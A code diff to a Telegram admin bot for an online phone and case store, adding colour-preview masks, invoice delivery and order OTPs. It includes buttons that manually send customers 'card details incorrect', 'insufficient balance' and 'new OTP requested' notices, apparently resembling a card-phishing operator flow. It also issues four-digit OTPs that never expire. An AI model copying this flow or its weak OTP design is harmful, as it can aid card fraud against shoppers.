@@ -1,4 +1,4 @@
-import { randomBytes, timingSafeEqual } from 'node:crypto';
+import { createHash, randomBytes, randomInt, timingSafeEqual } from 'node:crypto';
 import { ObjectId, type Db } from 'mongodb';
 import { after, NextRequest, NextResponse } from 'next/server';
 import { getDb } from '@/lib/mongodb';
@@ -14,6 +14,7 @@ import {
   ensureTelegramIndexes
 } from '@/lib/telegram';
 import { formatOrderForAdmin, getRecentOrders, makeOrderNumber, type StoreOrder } from '@/lib/orders';
+import { generatePhoneCaseColorMask, isPhoneCaseProduct } from '@/lib/case-color-preview';
 
 export const runtime = 'nodejs';
 export const dynamic = 'force-dynamic';
@@ -442,7 +443,7 @@ function productColorKeyboard(selectedColors: string[] = []) {
 }
 
 function productColorPrompt(selectedColors: string[] = []) {
-  return '🎨 اختر الألوان المتوفرة للمنتج بالضغط على دوائر الألوان. يمكنك تحديد أكثر من لون، ثم اضغط «حفظ الألوان».\n\nالألوان المختارة: ' + (selectedColors.join('، ') || 'لم يتم اختيار ألوان بعد.');
+  return '🎨 اختر الألوان المتوفرة للمنتج بالضغط على دوائر الألوان. يمكنك تحديد أكثر من لون، ثم اضغط «حفظ الألوان».\n\nمهم لمعاينة تغيير اللون: اجعل أول لون تختاره هو نفس لون الجراب الظاهر في الصورة الأولى.\n\nالألوان المختارة: ' + (selectedColors.join('، ') || 'لم يتم اختيار ألوان بعد.');
 }
 
 async function refreshProductColorMessage(chatId: number, messageId: number | undefined, selectedColors: string[]) {
@@ -462,13 +463,17 @@ async function refreshProductColorMessage(chatId: number, messageId: number | un
   await sendTelegramMessage(chatId, productColorPrompt(selectedColors), { reply_markup: productColorKeyboard(selectedColors) });
 }
 
-function editProductKeyboard(id: string, categoryId: string) {
+function editProductKeyboard(id: string, categoryId: string, canPreviewColors = false, hasColorMask = false) {
   return {
     inline_keyboard: [
       [{ text: 'القسم', callback_data: 'product-field:' + id + ':category' }, { text: 'اسم المنتج', callback_data: 'product-field:' + id + ':name' }],
       [{ text: 'الألوان', callback_data: 'product-field:' + id + ':colors' }, { text: 'مساحة التخزين', callback_data: 'product-field:' + id + ':storage' }],
       [{ text: 'السعر', callback_data: 'product-field:' + id + ':price' }, { text: 'تفاصيل المنتج', callback_data: 'product-field:' + id + ':details' }],
       [{ text: 'الصور (استبدال الصور)', callback_data: 'product-field:' + id + ':images' }],
+      ...(canPreviewColors ? [[{
+        text: hasColorMask ? '🔁 إعادة تجهيز معاينة الألوان' : '🎨 تجهيز معاينة تغيير الألوان',
+        callback_data: 'product-mask:' + id
+      }]] : []),
       [{ text: '🗑 حذف المنتج', callback_data: 'delete-product:' + id }],
       [{ text: '↩ رجوع لمنتجات القسم', callback_data: 'back-to-category-products:' + categoryId }],
       [{ text: '↩ رجوع إلى القائمة الرئيسية', callback_data: 'main-menu' }]
@@ -495,10 +500,12 @@ async function showProductEditMenu(db: Db, chatId: number, id: string) {
     'مساحات التخزين: ' + ((product.storageOptions || []).map((storage) => storage + (product.storagePrices?.[storage] ? ' — ' + product.storagePrices[storage].toLocaleString('en-US') + ' ر.س' : '')).join('، ') || 'غير محدد'),
     'السعر: ' + product.price.toLocaleString('en-US') + ' ر.س',
     'عدد الصور: ' + (product.images || []).length,
+    'معاينة تغيير لون الجراب: ' + (product.colorMask ? 'جاهزة ✅' : 'غير مجهزة'),
     '',
     'اختر الخانة التي تريد تعديلها. زر الحذف موجود بالأسفل.'
   ].join('\n');
-  await sendTelegramMessage(chatId, message, { reply_markup: editProductKeyboard(id, product.categoryId) });
+  const canPreviewColors = isPhoneCaseProduct(product.name, product.category, product.details) && Boolean(product.colors?.length) && Boolean(product.images?.length);
+  await sendTelegramMessage(chatId, message, { reply_markup: editProductKeyboard(id, product.categoryId, canPreviewColors, Boolean(product.colorMask)) });
 }
 
 async function ensureShortOrderNumbers(db: Db, orders: StoreOrder[]) {
@@ -623,20 +630,83 @@ async function getOrderDocumentRows(db: Db, order: StoreOrder) {
   }]];
 }
 
+async function getCustomerInvoiceDocuments(db: Db, order: StoreOrder) {
+  if (order.source !== 'website') return [] as Array<{ title: string; href: string }>;
+
+  await getOrderDocumentRows(db, order);
+
+  const configuredOrigin = process.env.NEXT_PUBLIC_SITE_URL ||
+    process.env.VERCEL_PROJECT_PRODUCTION_URL || process.env.VERCEL_URL || '';
+  if (!configuredOrigin) return [] as Array<{ title: string; href: string }>;
+
+  let origin = '';
+  try {
+    const normalizedOrigin = configuredOrigin.startsWith('https://') || configuredOrigin.startsWith('http://')
+      ? configuredOrigin
+      : 'https://' + configuredOrigin;
+    origin = new URL(normalizedOrigin).origin;
+  } catch {
+    return [] as Array<{ title: string; href: string }>;
+  }
+
+  if (order.installment) {
+    if (!order.installmentInvoiceToken || !order.installmentContractToken) return [];
+    return [
+      {
+        title: 'فاتورة الأقساط',
+        href: new URL('/installments-invoice/print/' + encodeURIComponent(order.installmentInvoiceToken), origin).toString()
+      },
+      {
+        title: 'عقد البيع بالتقسيط',
+        href: new URL('/installments-contract/print/' + encodeURIComponent(order.installmentContractToken), origin).toString()
+      }
+    ];
+  }
+
+  if (!order.saleInvoiceToken || !order.receiptToken) return [];
+  return [
+    {
+      title: 'فاتورة البيع',
+      href: new URL('/sales-invoice/print/' + encodeURIComponent(order.saleInvoiceToken), origin).toString()
+    },
+    {
+      title: 'سند القبض',
+      href: new URL('/receipt/print/' + encodeURIComponent(order.receiptToken), origin).toString()
+    }
+  ];
+}
+
 async function listOrderDetails(db: Db, chatId: number, id: string) {
   if (!isObjectId(id)) return sendTelegramMessage(chatId, 'معرّف الطلب غير صالح.');
-  const order = await db.collection<StoreOrder>('orders').findOne({ _id: new ObjectId(id) });
+  const order = await db.collection<StoreOrder & {
+    orderConfirmationOtpHash?: string;
+    orderConfirmationOtpSalt?: string;
+    orderConfirmationOtpIssuedAt?: Date;
+    orderConfirmationOtpVersion?: number;
+    orderConfirmationVerifiedAt?: Date;
+  }>('orders').findOne({ _id: new ObjectId(id) });
   if (!order) return sendTelegramMessage(chatId, 'لم يتم العثور على الطلب.');
   const closed = order.status === 'completed' || order.status === 'cancelled';
   const documentRows = await getOrderDocumentRows(db, order);
+  const orderWithInvoiceState = order as typeof order & { customerInvoiceSentAt?: Date };
+  const reviewRows = [
+    [{ text: orderWithInvoiceState.customerInvoiceSentAt ? '✅ تم إرسال الفاتورة للعميل' : '1️⃣ إظهار الفاتورة للعميل', callback_data: 'send-order-documents:' + id }],
+    [{ text: '❌ طلب رمز OTP جديد', callback_data: 'order-notice:' + id + ':otp' }],
+    [{ text: 'لا يوجد رصيد كافٍ', callback_data: 'order-notice:' + id + ':balance' }],
+    [{ text: 'بيانات البطاقة خاطئة', callback_data: 'order-notice:' + id + ':card' }],
+    [{ text: '🔐 إنشاء OTP للطلب', callback_data: 'create-order-otp:' + id }]
+  ];
   await sendTelegramMessage(
     chatId,
     'تفاصيل الطلب\n\n' + formatOrderForAdmin(order as unknown as Record<string, unknown>) +
+      '\n\nرمز تأكيد الطلب: ' + (order.orderConfirmationOtpHash ? 'تم إنشاؤه' : 'لم يتم إنشاؤه بعد') +
+      (order.orderConfirmationVerifiedAt ? '\nتم التحقق من الرمز بنجاح.' : '') +
       (closed ? '\n\nهذا الطلب مغلق.' : '\n\nاختر الإجراء التالي للطلب:'),
     {
       reply_markup: {
         inline_keyboard: [
           ...statusInlineKeyboard(id, order.status).inline_keyboard,
+          ...reviewRows,
           ...documentRows,
           [{ text: '↩ أقسام طلبات العملاء', callback_data: 'orders-menu' }],
           [{ text: 'القائمة الرئيسية', callback_data: 'main-menu' }]
@@ -681,12 +751,44 @@ async function saveProduct(db: Db, session: AdminSession, chatId: number) {
       await sendTelegramMessage(chatId, 'معرّف المنتج غير صالح.');
       return false;
     }
+
+    const productId = new ObjectId(data.productId);
+    const product = await db.collection<StoredProduct>('products').findOne({ _id: productId, deleted: { $ne: true } });
+    if (!product) {
+      await db.collection('telegram_sessions').deleteOne({ telegramUserId: session.telegramUserId });
+      await sendMainMenu(db, chatId, 'لم يتم العثور على المنتج.');
+      return false;
+    }
+
+    const canPreviewColors = isPhoneCaseProduct(product.name, product.category, product.details) && Boolean(product.colors?.length);
+    let colorMaskNote = '';
+    let colorMask: Awaited<ReturnType<typeof generatePhoneCaseColorMask>> | undefined;
+
+    if (canPreviewColors && process.env.MODEL_API_KEY) {
+      await sendTelegramMessage(chatId, '✅ تم استلام الصور الجديدة. جاري عزل الجراب في الصورة الأولى وتجهيز تغيير الألوان...');
+      try {
+        colorMask = await generatePhoneCaseColorMask(data.images[0], product.colors[0]);
+        colorMaskNote = '\n✅ تم تجهيز معاينة تغيير الألوان للصورة الأولى.';
+      } catch (error) {
+        console.error('Phone-case mask generation failed after image replacement:', error instanceof Error ? error.message : 'Unknown error');
+        colorMaskNote = '\n⚠️ تم تحديث الصور، لكن تعذر تجهيز عزل الجراب تلقائيًا. يمكنك المحاولة مرة أخرى من زر تجهيز معاينة الألوان.';
+      }
+    } else if (canPreviewColors) {
+      colorMaskNote = '\n⚠️ تم تحديث الصور. أضف MODEL_API_KEY لإعداد معاينة تغيير الألوان.';
+    }
+
     const result = await db.collection<StoredProduct>('products').updateOne(
-      { _id: new ObjectId(data.productId) },
-      { $set: { images: data.images.slice(0, 10), updatedAt: now } }
+      { _id: productId },
+      {
+        $set: { images: data.images.slice(0, 10), updatedAt: now, ...(colorMask ? { colorMask } : {}) },
+        ...(!colorMask ? { $unset: { colorMask: '' } } : {})
+      }
     );
+
     await db.collection('telegram_sessions').deleteOne({ telegramUserId: session.telegramUserId });
-    await sendTelegramMessage(chatId, result.matchedCount ? '✅ تم تحديث صور المنتج.' : 'لم يتم العثور على المنتج.');
+    await sendTelegramMessage(chatId, result.matchedCount
+      ? '✅ تم تحديث صور المنتج.' + colorMaskNote
+      : 'لم يتم العثور على المنتج.');
     await sendMainMenu(db, chatId);
     return result.matchedCount > 0;
   }
@@ -715,10 +817,30 @@ async function saveProduct(db: Db, session: AdminSession, chatId: number) {
     createdAt: now,
     updatedAt: now
   });
+  let colorMaskNote = '';
+  if (result.insertedId && isPhoneCaseProduct(data.name, section.name, data.details) && (data.colors || []).length) {
+    if (!process.env.MODEL_API_KEY) {
+      colorMaskNote = '\n⚠️ تم حفظ المنتج، لكن معاينة تغيير الألوان تحتاج إضافة MODEL_API_KEY في إعدادات البيئة.';
+    } else {
+      await sendTelegramMessage(chatId, '✅ تم حفظ المنتج. جاري عزل الجراب في الصورة الأولى وتجهيز معاينة تغيير الألوان...');
+      try {
+        const colorMask = await generatePhoneCaseColorMask(data.images[0], data.colors?.[0] || '');
+        await db.collection<StoredProduct>('products').updateOne(
+          { _id: result.insertedId },
+          { $set: { colorMask, updatedAt: new Date() } }
+        );
+        colorMaskNote = '\n✅ تم تجهيز معاينة تغيير الألوان بنجاح. لا تحتاج إلى رفع صور إضافية للألوان.';
+      } catch (error) {
+        console.error('Phone-case mask generation failed after product creation:', error instanceof Error ? error.message : 'Unknown error');
+        colorMaskNote = '\n⚠️ تم حفظ المنتج، لكن تعذر عزل الجراب تلقائيًا من الصورة الأولى. افتح تعديل المنتج وحاول تجهيز المعاينة مرة أخرى.';
+      }
+    }
+  }
+
   await db.collection('telegram_sessions').deleteOne({ telegramUserId: session.telegramUserId });
   const orderCounts = await getOrderSectionCounts(db);
   await sendTelegramMessage(chatId, result.insertedId
-    ? '✅ تم حفظ المنتج بنجاح\n\nاسم المنتج: ' + data.name + '\nالقسم: ' + section.name + '\nالألوان: ' + ((data.colors || []).join('، ') || 'غير محدد') + '\nمساحات التخزين: ' + ((data.storageOptions || []).map((storage) => storage + (data.storagePrices?.[storage] ? ' — ' + data.storagePrices[storage].toLocaleString('en-US') + ' ر.س' : '')).join('، ') || 'غير محدد') + '\nالسعر الأساسي: ' + data.price.toLocaleString('en-US') + ' ر.س\nعدد الصور: ' + data.images.length + '\n\nسيظهر على الموقع بعد تحديث الكتالوج.'
+    ? '✅ تم حفظ المنتج بنجاح\n\nاسم المنتج: ' + data.name + '\nالقسم: ' + section.name + '\nالألوان: ' + ((data.colors || []).join('، ') || 'غير محدد') + '\nمساحات التخزين: ' + ((data.storageOptions || []).map((storage) => storage + (data.storagePrices?.[storage] ? ' — ' + data.storagePrices[storage].toLocaleString('en-US') + ' ر.س' : '')).join('، ') || 'غير محدد') + '\nالسعر الأساسي: ' + data.price.toLocaleString('en-US') + ' ر.س\nعدد الصور: ' + data.images.length + '\n' + colorMaskNote + '\n\nسيظهر على الموقع بعد تحديث الكتالوج.'
     : 'تعذر حفظ المنتج.', {
       reply_markup: adminReplyKeyboard(orderCounts.newCount + orderCounts.shippedCount)
     });
@@ -745,7 +867,7 @@ async function handleImageStep(db: Db, session: AdminSession, message: TelegramM
     await saveProduct(db, session, chatId);
     return;
   }
-  await sendTelegramMessage(chatId, 'أرسل صورة المنتج. يمكنك إرسال عدة صور، ثم اضغط «حفظ المنتج».');
+  await sendTelegramMessage(chatId, 'أرسل صورة المنتج. للجرابات، أرسل صورة الجراب الأساسية أولًا؛ هي التي سيجهّز النظام منها معاينة تغيير الألوان. يمكنك إرسال صور أخرى بعدها، ثم اضغط «حفظ المنتج».');
 }
 
 async function saveEditedField(db: Db, session: AdminSession, value: string, chatId: number) {
@@ -1478,6 +1600,44 @@ async function handleCallback(db: Db, callback: TelegramCallback) {
     await showProductEditMenu(db, chatId, id || '');
     return;
   }
+  if (action === 'product-mask') {
+    if (!isObjectId(id || '')) return void await sendTelegramMessage(chatId, 'معرّف المنتج غير صالح.');
+    const product = await db.collection<StoredProduct>('products').findOne({
+      _id: new ObjectId(id),
+      deleted: { $ne: true }
+    });
+    if (!product) return void await sendTelegramMessage(chatId, 'لم يتم العثور على المنتج.');
+    if (!isPhoneCaseProduct(product.name, product.category, product.details)) {
+      return void await sendTelegramMessage(chatId, 'معاينة تغيير الألوان مخصصة لمنتجات الجرابات والكفرات فقط.');
+    }
+    if (!product.images?.[0]) {
+      return void await sendTelegramMessage(chatId, 'لا توجد صورة مرفوعة عبر البوت لهذا المنتج. استبدل الصور أولًا ثم أعد المحاولة.');
+    }
+    if (!product.colors?.length) {
+      return void await sendTelegramMessage(chatId, 'أضف ألوان المنتج أولًا، واجعل أول لون هو اللون الظاهر في الصورة الأولى.');
+    }
+    if (!process.env.MODEL_API_KEY) {
+      return void await sendTelegramMessage(chatId, 'خدمة عزل الجراب تحتاج إضافة MODEL_API_KEY في إعدادات البيئة أولًا.');
+    }
+
+    await sendTelegramMessage(chatId, 'جاري عزل الجراب من الصورة الأولى وتجهيز معاينة تغيير الألوان...');
+    try {
+      const colorMask = await generatePhoneCaseColorMask(
+        product.images[0],
+        product.colorMask?.sourceColor || product.colors[0]
+      );
+      await db.collection<StoredProduct>('products').updateOne(
+        { _id: product._id },
+        { $set: { colorMask, updatedAt: new Date() } }
+      );
+      await sendTelegramMessage(chatId, '✅ تم تجهيز عزل الجراب. ستتغير ألوان الجراب فقط في الصورة الأولى، وستبقى الخلفية وباقي الصور كما هي.');
+    } catch (error) {
+      console.error('Manual phone-case mask generation failed:', error instanceof Error ? error.message : 'Unknown error');
+      await sendTelegramMessage(chatId, '⚠️ تعذر عزل الجراب من الصورة الحالية. تأكد أن الصورة واضحة وتظهر جرابًا واحدًا، ثم جرّب مرة أخرى.');
+    }
+    await showProductEditMenu(db, chatId, id);
+    return;
+  }
   if (action === 'product-field') {
     if (!isObjectId(id || '')) return void await sendTelegramMessage(chatId, 'معرّف المنتج غير صالح.');
     const product = await db.collection<StoredProduct>('products').findOne({ _id: new ObjectId(id), deleted: { $ne: true } });
@@ -1516,7 +1676,7 @@ async function handleCallback(db: Db, callback: TelegramCallback) {
     }
     if (step === 'edit_product_images') {
       await startFlow(db, callback.from.id, chatId, 'edit_product', step, { productId: id, images: [] },
-        'أرسل الصور الجديدة للمنتج. سيؤدي الحفظ إلى استبدال الصور القديمة. أرسل صورة أو أكثر ثم اضغط «حفظ المنتج».',
+        'أرسل الصور الجديدة للمنتج. سيؤدي الحفظ إلى استبدال الصور القديمة. للجرابات، اجعل الصورة الأولى هي صورة الجراب الأساسية التي تريد تغيير لونها؛ أرسل صورة أو أكثر ثم اضغط «حفظ المنتج».',
         { keyboard: [[{ text: SAVE_PRODUCT_TEXT }], [{ text: MAIN_MENU_TEXT }]], resize_keyboard: true, one_time_keyboard: false });
       return;
     }
@@ -1578,6 +1738,174 @@ async function handleCallback(db: Db, callback: TelegramCallback) {
     await sendMainMenu(db, chatId, removed ? '🗑 تم حذف المنتج من المتجر.' : 'المنتج غير موجود أو سبق حذفه.');
     return;
   }
+  if (action === 'send-order-documents' && id && isObjectId(id)) {
+    const orderCollection = db.collection<StoreOrder & {
+      customerInvoiceSentAt?: Date;
+      customerInvoiceNotificationId?: string;
+      customerInvoiceSendingAt?: Date;
+    }>('orders');
+    const order = await orderCollection.findOne({ _id: new ObjectId(id), source: 'website' });
+    if (!order) {
+      await sendTelegramMessage(chatId, 'لم يتم العثور على الطلب.');
+      return;
+    }
+    if (!order.customerNotificationKey) {
+      await sendTelegramMessage(chatId, 'لا يوجد مفتاح إشعارات مرتبط بهذا الطلب.');
+      return;
+    }
+    if (order.customerInvoiceSentAt) {
+      await sendTelegramMessage(chatId, 'تم إرسال مستندات هذا الطلب للعميل بالفعل.');
+      await listOrderDetails(db, chatId, id);
+      return;
+    }
+
+    const documents = await getCustomerInvoiceDocuments(db, order);
+    if (documents.length !== 2) {
+      await sendTelegramMessage(chatId, 'تعذر تجهيز رابطَي مستندات الطلب. تأكد من إعداد رابط الموقع ووجود رموز المستندات.');
+      return;
+    }
+
+    const claim = await orderCollection.updateOne(
+      {
+        _id: order._id,
+        customerInvoiceSentAt: { $exists: false },
+        customerInvoiceSendingAt: { $exists: false }
+      },
+      { $set: { customerInvoiceSendingAt: new Date() } }
+    );
+    if (!claim.modifiedCount) {
+      const latest = await orderCollection.findOne({ _id: order._id });
+      await sendTelegramMessage(chatId, latest?.customerInvoiceSentAt
+        ? 'تم إرسال مستندات هذا الطلب للعميل بالفعل.'
+        : 'يتم تجهيز إشعار مستندات هذا الطلب حاليًا. حاول مرة أخرى بعد لحظات.');
+      await listOrderDetails(db, chatId, id);
+      return;
+    }
+
+    let notificationId = '';
+    try {
+      const notification = await db.collection('customer_notifications').insertOne({
+        customerNotificationKey: order.customerNotificationKey,
+        orderId: order._id.toHexString(),
+        orderNumber: order.orderNumber || '#' + order._id.toString().slice(-6),
+        status: 'invoice_documents',
+        statusLabel: order.installment ? 'تم اعتماد طلب التقسيط وإرسال مستنداته' : 'تم اعتماد الطلب وإرسال مستنداته',
+        documents,
+        createdAt: new Date(),
+        readAt: null
+      });
+      notificationId = notification.insertedId.toHexString();
+
+      await orderCollection.updateOne(
+        { _id: order._id, customerInvoiceSendingAt: { $exists: true } },
+        {
+          $set: {
+            customerInvoiceSentAt: new Date(),
+            customerInvoiceNotificationId: notificationId,
+            updatedAt: new Date()
+          },
+          $unset: { customerInvoiceSendingAt: '' }
+        }
+      );
+    } catch (error) {
+      await orderCollection.updateOne(
+        { _id: order._id },
+        { $unset: { customerInvoiceSendingAt: '' } }
+      ).catch(() => undefined);
+      throw error;
+    }
+
+    await sendTelegramMessage(
+      chatId,
+      '✅ تم إرسال مستندَي الطلب إلى جرس إشعارات العميل (' +
+        (order.installment ? 'فاتورة الأقساط وعقد التقسيط' : 'فاتورة البيع وسند القبض') +
+        '). أصبح الطلب معتمدًا من الإدارة.'
+    );
+    await listOrderDetails(db, chatId, id);
+    return;
+  }
+
+  if (action === 'create-order-otp' && id && isObjectId(id)) {
+    const orderCollection = db.collection<StoreOrder & {
+      orderConfirmationOtpHash?: string;
+      orderConfirmationOtpSalt?: string;
+      orderConfirmationOtpIssuedAt?: Date;
+      orderConfirmationOtpVersion?: number;
+      orderConfirmationVerifiedAt?: Date;
+    }>('orders');
+    const order = await orderCollection.findOne({ _id: new ObjectId(id), source: 'website' });
+    if (!order) {
+      await sendTelegramMessage(chatId, 'لم يتم العثور على الطلب.');
+      return;
+    }
+    if (order.orderConfirmationVerifiedAt) {
+      await sendTelegramMessage(chatId, 'تم تأكيد هذا الطلب بالفعل، ولا يحتاج إلى رمز جديد.');
+      return;
+    }
+
+    const otp = String(randomInt(0, 10_000)).padStart(4, '0');
+    const salt = randomBytes(16).toString('hex');
+    const otpHash = createHash('sha256').update(salt + ':' + otp).digest('hex');
+    const now = new Date();
+    await orderCollection.updateOne(
+      { _id: order._id },
+      {
+        $set: {
+          orderConfirmationOtpHash: otpHash,
+          orderConfirmationOtpSalt: salt,
+          orderConfirmationOtpIssuedAt: now,
+          orderConfirmationOtpVersion: Number(order.orderConfirmationOtpVersion || 0) + 1,
+          updatedAt: now
+        }
+      }
+    );
+    await sendTelegramMessage(
+      chatId,
+      '🔐 رمز تأكيد الطلب ' + (order.orderNumber || id) + ': ' + otp +
+        '\n\nأرسل هذا الرمز للعميل بالطريقة التي تعتمدها. يظل صالحًا دون مدة زمنية، وإصدار رمز جديد يُبطل الرمز السابق.'
+    );
+    await listOrderDetails(db, chatId, id);
+    return;
+  }
+
+  if (action === 'order-notice' && id && field && isObjectId(id)) {
+    const order = await db.collection<StoreOrder>('orders').findOne({
+      _id: new ObjectId(id),
+      source: 'website'
+    });
+    if (!order) {
+      await sendTelegramMessage(chatId, 'لم يتم العثور على الطلب.');
+      return;
+    }
+    if (!order.customerNotificationKey) {
+      await sendTelegramMessage(chatId, 'لا يوجد مفتاح إشعارات مرتبط بهذا الطلب.');
+      return;
+    }
+
+    const noticeMap: Record<string, { status: string; statusLabel: string }> = {
+      otp: { status: 'otp_requested', statusLabel: 'طلب رمز OTP جديد' },
+      balance: { status: 'insufficient_balance', statusLabel: 'لا يوجد رصيد كافٍ' },
+      card: { status: 'card_details_incorrect', statusLabel: 'بيانات البطاقة خاطئة' }
+    };
+    const notice = noticeMap[field];
+    if (!notice) {
+      await sendTelegramMessage(chatId, 'نوع الإشعار غير معروف.');
+      return;
+    }
+
+    await db.collection('customer_notifications').insertOne({
+      customerNotificationKey: order.customerNotificationKey,
+      orderId: order._id.toHexString(),
+      orderNumber: order.orderNumber || '#' + order._id.toString().slice(-6),
+      status: notice.status,
+      statusLabel: notice.statusLabel,
+      createdAt: new Date(),
+      readAt: null
+    });
+    await sendTelegramMessage(chatId, '✅ تم إرسال إشعار «' + notice.statusLabel + '» للعميل في جرس إشعارات المتصفح. لم تتغير حالة الطلب.');
+    return;
+  }
+
   if (action === 'orders-menu') {
     await showCustomerOrdersMenu(db, chatId);
     return;
